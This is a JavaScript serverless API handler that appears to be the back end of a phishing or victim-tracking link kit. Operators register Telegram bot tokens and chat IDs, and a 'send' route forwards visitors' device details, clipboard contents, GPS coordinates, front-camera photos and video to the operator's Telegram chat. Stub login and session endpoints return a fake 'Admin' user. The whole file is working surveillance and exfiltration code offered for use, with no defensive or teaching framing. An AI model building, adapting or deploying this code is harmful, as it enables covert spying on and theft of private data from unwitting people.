const R_URL = process.env.UPSTASH_REDIS_REST_URL || "";
const R_TOK = process.env.UPSTASH_REDIS_REST_TOKEN || "";

async function getLinks() {
  if (!R_URL) return [];
  const r = await fetch(R_URL + "/get/links", { headers: { Authorization: "Bearer " + R_TOK } });
  const j = await r.json();
  return j.result ? JSON.parse(j.result) : [];
}

async function setLinks(links) {
  if (!R_URL) return;
  await fetch(R_URL + "/set/links/" + encodeURIComponent(JSON.stringify(links)), { headers: { Authorization: "Bearer " + R_TOK } });
}

function rid(n) {
  let s = "";
  const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (let i = 0; i < n; i++) s += c[Math.floor(Math.random() * c.length)];
  return s;
}

export default async function handler(req, res) {
  const p = (req.query.path || []).join("/");

  if (p === "csrf") return res.status(200).json({ csrfToken: "tok-" + rid(10) });
  if (p === "auth/session") return res.status(200).json({ uid: "user-" + rid(6), name: "Admin" });
  if (p === "auth/logout") return res.status(200).json({ success: true });

  if (p === "links/list" && req.method === "GET") {
    return res.status(200).json(await getLinks());
  }

  if (p === "links/create" && req.method === "POST") {
    const { botToken, chatId } = req.body || {};
    if (!botToken || !chatId) return res.status(400).json({ error: "Faltan botToken o chatId" });
    let botName = "Bot " + rid(4);
    try {
      const me = await fetch("https://api.telegram.org/bot" + botToken + "/getMe").then(r => r.json());
      if (me.ok) botName = me.result.username || me.result.first_name || botName;
    } catch (e) {}
    const links = await getLinks();
    const link = { id: rid(18), botName, botToken, chatId, status: "ACTIVE", createdAt: new Date().toISOString() };
    links.push(link);
    await setLinks(links);
    return res.status(200).json(link);
  }

  if (p === "links/update" && req.method === "PUT") {
    const id = req.query.id;
    const { botToken, chatId } = req.body || {};
    const links = await getLinks();
    const l = links.find(x => x.id === id);
    if (l) { l.botToken = botToken || l.botToken; l.chatId = chatId || l.chatId; }
    await setLinks(links);
    return res.status(200).json({ success: true });
  }

  if (p === "links/delete" && req.method === "DELETE") {
    const id = req.query.id;
    let links = await getLinks();
    links = links.filter(x => x.id !== id);
    await setLinks(links);
    return res.status(200).json({ success: true });
  }

  if (p === "send" && req.method === "POST") {
    const { linkId, type, data } = req.body || {};
    const links = await getLinks();
    const link = links.find(x => x.id === linkId);
    if (!link) return res.status(404).json({ error: "Link no encontrado" });
    const T = "https://api.telegram.org/bot" + link.botToken + "/";
    try {
      if (type === "device_info") {
        const d = (data && data.deviceInfo) || {};
        await fetch(T + "sendMessage", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: link.chatId, parse_mode: "HTML", text: "📱 <b>Device Info</b>\n🔹 OS: " + (d.osVersion || "?") + "\n🔹 Brand: " + (d.brand || "?") + "\n🔹 Type: " + (d.deviceType || "?") + "\n🔹 Clipboard: " + String((data && data.clipboard) || "").slice(0, 300) }) });
      } else if (type === "location") {
        await fetch(T + "sendMessage", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: link.chatId, text: "📍 Ubicación: https://maps.google.com/?q=" + data.latitude + "," + data.longitude }) });
      } else if (type === "photo") {
        const b64 = String(data || "").split("base64,").pop();
        const buf = Buffer.from(b64, "base64");
        const form = new FormData();
        form.append("chat_id", link.chatId);
        form.append("photo", new Blob([buf], { type: "image/jpeg" }), "camara.jpg");
        form.append("caption", "📸 Front Camera");
        await fetch(T + "sendPhoto", { method: "POST", body: form });
      } else if (type === "video") {
        const b64 = String(data || "").split("base64,").pop();
        const buf = Buffer.from(b64, "base64");
        const form = new FormData();
        form.append("chat_id", link.chatId);
        form.append("video", new Blob([buf], { type: "video/webm" }), "video.webm");
        form.append("caption", "🎥 Video");
        await fetch(T + "sendVideo", { method: "POST", body: form });
      } else if (type === "clipboard") {
        await fetch(T + "sendMessage", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: link.chatId, text: "📋 Clipboard:\n" + String((data && data.text) || "") }) });
      }
    } catch (e) {
      return res.status(200).json({ success: false, error: String(e) });
    }
    return res.status(200).json({ success: true });
  }

  return res.status(404).json({ error: "Ruta no encontrada: " + p });
}
